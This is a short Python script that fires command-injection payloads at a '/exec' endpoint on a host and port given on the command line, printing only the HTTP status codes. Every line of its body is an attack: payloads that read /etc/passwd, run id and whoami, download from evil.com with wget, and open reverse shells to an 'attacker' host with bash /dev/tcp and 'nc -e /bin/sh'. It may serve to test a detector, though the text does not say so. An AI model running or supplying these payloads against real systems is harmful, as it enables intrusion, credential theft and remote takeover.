"""Command injection attacks."""

import sys
import urllib.request
import urllib.parse
import urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "80"
BASE = f"http://{TARGET}:{PORT}"

def req(method, path, body=None, headers=None):
    url = f"{BASE}{path}"
    data = urllib.parse.urlencode(body).encode() if body else None
    hdrs = headers or {}
    hdrs.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        print(f"  {method:4s} {path:35s} -> {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"  {method:4s} {path:35s} -> {e.code}")

print(f"\n── Command injection ── target={TARGET}:{PORT}\n")

req("POST", "/exec", {"cmd": "; ls -la /etc"})
req("POST", "/exec", {"cmd": "; cat /etc/passwd"})
req("POST", "/exec", {"cmd": "; id"})
req("POST", "/exec", {"cmd": "`whoami`"})
req("POST", "/exec", {"cmd": "`cat /etc/passwd | grep root`"})
req("POST", "/exec", {"cmd": "id; wget http://evil.com/payload"})
req("POST", "/exec", {"cmd": "| bash -i >& /dev/tcp/attacker/4444 0>&1"})
req("POST", "/exec", {"cmd": "|| whoami"})
req("POST", "/exec", {"cmd": "&& nc -e /bin/sh attacker 4444"})

print("\nDone.")
